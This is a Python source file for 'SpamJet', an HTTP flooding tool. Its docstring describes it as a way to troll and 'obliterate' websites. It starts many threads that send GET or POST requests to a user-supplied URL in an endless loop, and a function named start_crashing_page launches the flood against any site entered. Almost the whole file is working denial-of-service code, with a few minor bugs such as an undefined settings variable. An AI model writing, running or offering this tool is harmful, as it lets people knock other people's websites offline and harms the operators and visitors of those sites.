import os
import requests
import sys

from threading import Thread
from time import sleep, time

__doc__ = """Tool for stress-testing (trolling) websites ;)
100 threads for best performance, obliterates middle-end websites"""

__version__ = "SpamJet API 1.01"


class HttpSpammer:
    def __init__(self, verbose = False):
        self.target = None
        self.isactive = False
        self.isconnected = False
        self.verbose = verbose
        
        self.all_threads = []
        self.all_sessions = []
        self.all_prepped_packets = []
        
        self.thread_count = 0

    def spam_thread(self, thread_index):
        while self.isactive:
            try:
                if self.verbose:
                    print(self.all_sessions[thread_index].send(self.all_prepped_packets[thread_index]))
                else:
                    self.all_sessions[thread_index].send(self.all_prepped_packets[thread_index])

            except Exception as e:  # Usually caused by server actively refusing connection
                if self.verbose:
                    print(e)

    def connect(self, url, thread_count, mode = 'GET', body = '', user_agent = 'Mozilla/5.0'):
        if self.isconnected:
            raise RuntimeError('HttpSpammer already connected to {self.target}')

        else:
            try:
                self.isconnected = True
                for dummy in range(thread_count):
                    session = requests.Session()
                    req = requests.Request(mode, url)
                    prepped = session.prepare_request(req)
                    prepped.headers['User-Agent'] = user_agent
                    
                    if mode == 'POST':
                        prepped.body = body
                    
                    self.all_sessions.append(session)
                    self.all_prepped_packets.append(prepped)
                    self.all_threads.append(Thread(target=self.spam_thread, args=(dummy,)))  # Should set .daemon to True
                    
                self.thread_count = thread_count
                
            except requests.exceptions.MissingSchema:
                print(f'Failed to connect to {url}.', file=sys.stderr)
                self.isconnected = False

    def start(self):
        if self.isactive:
            raise RuntimeError('HttpSpammer already active')
        else:
            self.isactive = True
            for thread in self.all_threads:
                thread.start()

    def stop(self):
        self.isactive = False

all_spammers = []

def stop_all():
    for spammer in all_spammers:
        spammer.stop()

    all_spammers.clear()  # Discard all references to spammers

def start_crashing_page():  # Change this to read from a file or frontend
    url = input('URL to website: \n')
    spammer = HttpSpammer()
    spammer.connect(url, settings['threads'])
    spammer.start()
